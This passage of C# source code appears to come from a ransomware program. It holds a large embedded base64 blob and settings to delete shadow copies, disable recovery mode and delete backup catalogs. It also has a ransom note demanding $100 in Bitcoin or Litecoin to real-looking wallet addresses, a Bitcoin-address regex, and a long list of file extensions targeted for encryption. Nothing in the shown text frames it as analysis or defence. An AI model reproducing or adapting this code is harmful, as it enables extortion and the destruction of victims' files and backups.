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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[14]
	{
		"", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $100. Payment can be made in Bitcoin and Litecoin only.", "How do I pay, where do I get Bitcoin and Litecoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin and Litecoin. ", "", "",
		"Payment informationAmount: $100", "Bitcoin Address:  bc1q0a2az59et9lymfa77drzr5vvm6grl27kfdhsuj", "Litecoin Address:LMFQ6gbDxMr9wNJjo3Wm8ik4uJM6acyNsL", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
